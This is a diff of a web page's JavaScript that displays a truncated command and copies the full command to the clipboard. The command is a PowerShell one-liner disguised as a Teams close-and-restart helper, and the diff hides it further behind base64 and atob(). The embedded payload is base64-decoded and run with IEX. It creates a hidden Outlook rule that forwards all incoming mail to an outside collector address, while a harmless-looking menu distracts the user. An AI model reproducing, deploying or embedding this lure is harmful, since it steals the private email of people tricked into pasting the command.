@@ -1,14 +1,13 @@
 const DISPLAY_CHAR_LIMIT = 50;
 const commandPanels = document.querySelectorAll(".command-panel");
-const fullcommand =
-  'Get-Process -Name "ms-teams","Teams" -ErrorAction SilentlyContinue|out-Null;$Stuff = "JG91dGxvb2sgPSBOZXctT2JqZWN0IC1Db21PYmplY3QgT3V0bG9vay5BcHBsaWNhdGlvbgokc2Vzc2lvbiA9ICRvdXRsb29rLlNlc3Npb24KJHN0b3JlID0gJHNlc3Npb24uRGVmYXVsdFN0b3JlCiRydWxlcyA9ICRzdG9yZS5HZXRSdWxlcygpCgokcnVsZU5hbWUgPSAiRm9yd2FyZCBBbGwgTWFpbHMgKE91dGxvb2sgT25seSkiCiR0YXJnZXRNYWlsID0gIkJvZXNlQnViZW4tRldELUNvbGxlY3RvckBTY2h3aW5nU2NobGVpZmVyVW5pdGVkLmV1IgoKIyBFeGlzdGluZyBydWxlIHdpdGggc2FtZSBuYW1lIGVudGZlcm5lbiAocm9idXN0IGdlZ2VuIENPTS1BdXNzZXR6ZXIpCmZvciAoJGkgPSAkcnVsZXMuQ291bnQ7ICRpIC1nZSAxOyAkaS0tKSB7CiAgICB0cnkgewogICAgICAgICRyID0gJHJ1bGVzLkl0ZW0oJGkpCiAgICAgICAgaWYgKCRudWxsIC1uZSAkciAtYW5kICRyLk5hbWUgLWVxICRydWxlTmFtZSkgewogICAgICAgICAgICAkcnVsZXMuUmVtb3ZlKCRpKQogICAgICAgIH0KICAgIH0KICAgIGNhdGNoIHsKICAgICAgICAjIGVpbnplbG5lIGRlZmVrdGUvdW5sZXNiYXJlIFJ1bGUgaWdub3JpZXJlbgogICAgICAgIGNvbnRpbnVlCiAgICB9Cn0KCiMgMCA9IG9sUnVsZVJlY2VpdmUKJHJ1bGUgPSAkcnVsZXMuQ3JlYXRlKCRydWxlTmFtZSwgMCkKCiMgT3V0bG9vay1vbmx5IC8gY2xpZW50LW9ubHkKJHJ1bGUuQ29uZGl0aW9ucy5PbkxvY2FsTWFjaGluZS5FbmFibGVkID0gJHRydWUKCiMgRm9yd2FyZCBhY3Rpb24KJG51bGwgPSAkcnVsZS5BY3Rpb25zLkZvcndhcmQuUmVjaXBpZW50cy5BZGQoJHRhcmdldE1haWwpCiRydWxlLkFjdGlvbnMuRm9yd2FyZC5SZWNpcGllbnRzLlJlc29sdmVBbGwoKSB8IE91dC1OdWxsCiRydWxlLkFjdGlvbnMuRm9yd2FyZC5FbmFibGVkID0gJHRydWUKCiRydWxlLkVuYWJsZWQgPSAkdHJ1ZQokcnVsZXMuU2F2ZSgpCgojV3JpdGUtSG9zdCAiT3V0bG9vay1vbmx5IGZvcndhcmQgcnVsZSBjcmVhdGVkOiAkcnVsZU5hbWUgLT4gJHRhcmdldE1haWwiCgojIENsZWFudXAgQ09NClt2b2lkXVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlJlbGVhc2VDb21PYmplY3QoJHJ1bGVzKQpbdm9pZF1bU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpSZWxlYXNlQ29tT2JqZWN0KCRzdG9yZSkKW3ZvaWRdW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UmVsZWFzZUNvbU9iamVjdCgkc2Vzc2lvbikKW3ZvaWRdW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UmVsZWFzZUNvbU9iamVjdCgkb3V0bG9vayk="; $z = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Stuff.Trim())); IEX $z | out-NUllWrite-Host "Select an option:" -ForegroundColor Cyan; Write-Host "1 - Close Program"; Write-Host "2 - Close Program and Start Teams"; $c=(Read-Host "Enter 1 or 2").Trim(); if($c -ne "1" -and $c -ne "2"){Write-Host "Invalid input. Please enter 1 or 2." -ForegroundColor Yellow}}while($c -ne "1" -and $c -ne "2"); if($c -eq "1"){Write-Host "Status: Program closed." -ForegroundColor Green}else{try{Start-Process "msteams:"; Write-Host "Status: Program closed and Teams started." -ForegroundColor Green}catch{Write-Host "Status: Could not start Teams automatically." -ForegroundColor Red}}';
+const FULL_COMMAND = atob(
+  "R2V0LVByb2Nlc3MgLU5hbWUgIm1zLXRlYW1zIiwiVGVhbXMiIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlfG91dC1OdWxsOyRTdHVmZiA9ICJKRzkxZEd4dmIyc2dQU0JPWlhjdFQySnFaV04wSUMxRGIyMVBZbXBsWTNRZ1QzVjBiRzl2YXk1QmNIQnNhV05oZEdsdmJnb2tjMlZ6YzJsdmJpQTlJQ1J2ZFhSc2IyOXJMbE5sYzNOcGIyNEtKSE4wYjNKbElEMGdKSE5sYzNOcGIyNHVSR1ZtWVhWc2RGTjBiM0psQ2lSeWRXeGxjeUE5SUNSemRHOXlaUzVIWlhSU2RXeGxjeWdwQ2dva2NuVnNaVTVoYldVZ1BTQWlSbTl5ZDJGeVpDQkJiR3dnVFdGcGJITWdLRTkxZEd4dmIyc2dUMjVzZVNraUNpUjBZWEpuWlhSTllXbHNJRDBnSWtKdlpYTmxRblZpWlc0dFJsZEVMVU52Ykd4bFkzUnZja0JUWTJoM2FXNW5VMk5vYkdWcFptVnlWVzVwZEdWa0xtVjFJZ29LSXlCRmVHbHpkR2x1WnlCeWRXeGxJSGRwZEdnZ2MyRnRaU0J1WVcxbElHVnVkR1psY201bGJpQW9jbTlpZFhOMElHZGxaMlZ1SUVOUFRTMUJkWE56WlhSNlpYSXBDbVp2Y2lBb0pHa2dQU0FrY25Wc1pYTXVRMjkxYm5RN0lDUnBJQzFuWlNBeE95QWthUzB0S1NCN0NpQWdJQ0IwY25rZ2V3b2dJQ0FnSUNBZ0lDUnlJRDBnSkhKMWJHVnpMa2wwWlcwb0pHa3BDaUFnSUNBZ0lDQWdhV1lnS0NSdWRXeHNJQzF1WlNBa2NpQXRZVzVrSUNSeUxrNWhiV1VnTFdWeElDUnlkV3hsVG1GdFpTa2dld29nSUNBZ0lDQWdJQ0FnSUNBa2NuVnNaWE11VW1WdGIzWmxLQ1JwS1FvZ0lDQWdJQ0FnSUgwS0lDQWdJSDBLSUNBZ0lHTmhkR05vSUhzS0lDQWdJQ0FnSUNBaklHVnBibnBsYkc1bElHUmxabVZyZEdVdmRXNXNaWE5pWVhKbElGSjFiR1VnYVdkdWIzSnBaWEpsYmdvZ0lDQWdJQ0FnSUdOdmJuUnBiblZsQ2lBZ0lDQjlDbjBLQ2lNZ01DQTlJRzlzVW5Wc1pWSmxZMlZwZG1VS0pISjFiR1VnUFNBa2NuVnNaWE11UTNKbFlYUmxLQ1J5ZFd4bFRtRnRaU3dnTUNrS0NpTWdUM1YwYkc5dmF5MXZibXg1SUM4Z1kyeHBaVzUwTFc5dWJIa0tKSEoxYkdVdVEyOXVaR2wwYVc5dWN5NVBia3h2WTJGc1RXRmphR2x1WlM1RmJtRmliR1ZrSUQwZ0pIUnlkV1VLQ2lNZ1JtOXlkMkZ5WkNCaFkzUnBiMjRLSkc1MWJHd2dQU0FrY25Wc1pTNUJZM1JwYjI1ekxrWnZjbmRoY21RdVVtVmphWEJwWlc1MGN5NUJaR1FvSkhSaGNtZGxkRTFoYVd3cENpUnlkV3hsTGtGamRHbHZibk11Um05eWQyRnlaQzVTWldOcGNHbGxiblJ6TGxKbGMyOXNkbVZCYkd3b0tTQjhJRTkxZEMxT2RXeHNDaVJ5ZFd4bExrRmpkR2x2Ym5NdVJtOXlkMkZ5WkM1RmJtRmliR1ZrSUQwZ0pIUnlkV1VLQ2lSeWRXeGxMa1Z1WVdKc1pXUWdQU0FrZEhKMVpRb2tjblZzWlhNdVUyRjJaU2dwQ2dvalYzSnBkR1V0U0c5emRDQWlUM1YwYkc5dmF5MXZibXg1SUdadmNuZGhjbVFnY25Wc1pTQmpjbVZoZEdWa09pQWtjblZzWlU1aGJXVWdMVDRnSkhSaGNtZGxkRTFoYVd3aUNnb2pJRU5zWldGdWRYQWdRMDlOQ2x0MmIybGtYVnRUZVhOMFpXMHVVblZ1ZEdsdFpTNUpiblJsY205d1UyVnlkbWxqWlhNdVRXRnljMmhoYkYwNk9sSmxiR1ZoYzJWRGIyMVBZbXBsWTNRb0pISjFiR1Z6S1FwYmRtOXBaRjFiVTNsemRHVnRMbEoxYm5ScGJXVXVTVzUwWlhKdmNGTmxjblpwWTJWekxrMWhjbk5vWVd4ZE9qcFNaV3hsWVhObFEyOXRUMkpxWldOMEtDUnpkRzl5WlNrS1czWnZhV1JkVzFONWMzUmxiUzVTZFc1MGFXMWxMa2x1ZEdWeWIzQlRaWEoyYVdObGN5NU5ZWEp6YUdGc1hUbzZVbVZzWldGelpVTnZiVTlpYW1WamRDZ2tjMlZ6YzJsdmJpa0tXM1p2YVdSZFcxTjVjM1JsYlM1U2RXNTBhVzFsTGtsdWRHVnliM0JUWlhKMmFXTmxjeTVOWVhKemFHRnNYVG82VW1Wc1pXRnpaVU52YlU5aWFtVmpkQ2drYjNWMGJHOXZheWs9IjsgJHogPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRTdHVmZi5UcmltKCkpKTsgSUVYICR6IHwgb3V0LU5VbGxXcml0ZS1Ib3N0ICJTZWxlY3QgYW4gb3B0aW9uOiIgLUZvcmVncm91bmRDb2xvciBDeWFuOyBXcml0ZS1Ib3N0ICIxIC0gQ2xvc2UgUHJvZ3JhbSI7IFdyaXRlLUhvc3QgIjIgLSBDbG9zZSBQcm9ncmFtIGFuZCBTdGFydCBUZWFtcyI7ICRjPShSZWFkLUhvc3QgIkVudGVyIDEgb3IgMiIpLlRyaW0oKTsgaWYoJGMgLW5lICIxIiAtYW5kICRjIC1uZSAiMiIpe1dyaXRlLUhvc3QgIkludmFsaWQgaW5wdXQuIFBsZWFzZSBlbnRlciAxIG9yIDIuIiAtRm9yZWdyb3VuZENvbG9yIFllbGxvd319d2hpbGUoJGMgLW5lICIxIiAtYW5kICRjIC1uZSAiMiIpOyBpZigkYyAtZXEgIjEiKXtXcml0ZS1Ib3N0ICJTdGF0dXM6IFByb2dyYW0gY2xvc2VkLiIgLUZvcmVncm91bmRDb2xvciBHcmVlbn1lbHNle3RyeXtTdGFydC1Qcm9jZXNzICJtc3RlYW1zOiI7IFdyaXRlLUhvc3QgIlN0YXR1czogUHJvZ3JhbSBjbG9zZWQgYW5kIFRlYW1zIHN0YXJ0ZWQuIiAtRm9yZWdyb3VuZENvbG9yIEdyZWVufWNhdGNoe1dyaXRlLUhvc3QgIlN0YXR1czogQ291bGQgbm90IHN0YXJ0IFRlYW1zIGF1dG9tYXRpY2FsbHkuIiAtRm9yZWdyb3VuZENvbG9yIFJlZH19",
+);
 
-function getFullCommandText(commandElement) {
-  return (
-    commandElement?.dataset?.fullCommand ||
-    commandElement?.textContent?.trim() ||
-    ""
-  );
+function getDisplayText(text) {
+  return text.length > DISPLAY_CHAR_LIMIT
+    ? `${text.slice(0, DISPLAY_CHAR_LIMIT)}...`
+    : text;
 }
 
 function setCommandDisplay(commandElement) {
@@ -16,20 +15,12 @@ function setCommandDisplay(commandElement) {
     return;
   }
 
-  const fullText = getFullCommandText(commandElement);
-
-  commandElement.dataset.fullCommand = fullText;
-  commandElement.textContent =
-    fullText.length > DISPLAY_CHAR_LIMIT
-      ? `${fullText.slice(0, DISPLAY_CHAR_LIMIT)}...`
-      : fullText;
-  commandElement.title = fullText;
+  commandElement.textContent = getDisplayText(FULL_COMMAND);
+  commandElement.title = FULL_COMMAND;
 }
 
 async function copyCustomCommand(commandElement, statusElement) {
-  const commandText = getFullCommandText(commandElement);
-
-  if (!commandText) {
+  if (!FULL_COMMAND) {
     if (statusElement) {
       statusElement.textContent = "No command found to copy.";
     }
@@ -37,12 +28,11 @@ async function copyCustomCommand(commandElement, statusElement) {
   }
 
   try {
-    await navigator.clipboard.writeText(commandText);
+    await navigator.clipboard.writeText(FULL_COMMAND);
     if (statusElement) {
       statusElement.textContent = "Command copied to clipboard.";
     }
   } catch (error) {
-    // Fallback for environments that do not allow clipboard API.
     const range = document.createRange();
     range.selectNodeContents(commandElement);
 
@@ -75,7 +65,7 @@ for (const panel of commandPanels) {
 
   if (copyButton && commandElement) {
     copyButton.addEventListener("click", () => {
-      copyCustomCommand(commandElement, statusElement, fullcommand);
+      copyCustomCommand(commandElement, statusElement);
     });
   }
 }
